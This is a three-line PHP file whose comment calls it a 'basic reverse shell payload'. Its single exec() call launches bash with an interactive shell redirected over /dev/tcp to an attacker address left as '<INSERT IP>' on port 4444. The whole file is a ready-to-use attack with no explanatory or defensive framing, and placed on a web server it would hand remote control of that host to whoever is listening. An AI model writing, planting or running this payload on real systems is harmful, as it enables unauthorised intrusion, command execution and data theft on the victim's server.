<?php
// basic reverse shell payload
exec("/bin/bash -c 'bash -i >& /dev/tcp/<INSERT IP>/4444 0>&1'");
?>
